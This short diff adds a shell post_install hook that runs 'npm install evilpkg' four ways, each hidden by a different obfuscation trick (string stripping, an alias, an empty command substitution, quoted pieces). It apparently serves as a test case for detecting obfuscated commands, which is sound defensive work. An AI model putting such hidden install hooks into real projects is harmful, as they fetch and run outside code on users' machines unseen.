@@ -1,0 +1,7 @@
+post_install() {
+    v=nZpZm; ${v//Z/} install evilpkg
+    alias zz=npm
+    zz install evilpkg
+    n$()pm install evilpkg
+    $"n"$"pm" install evilpkg
+}
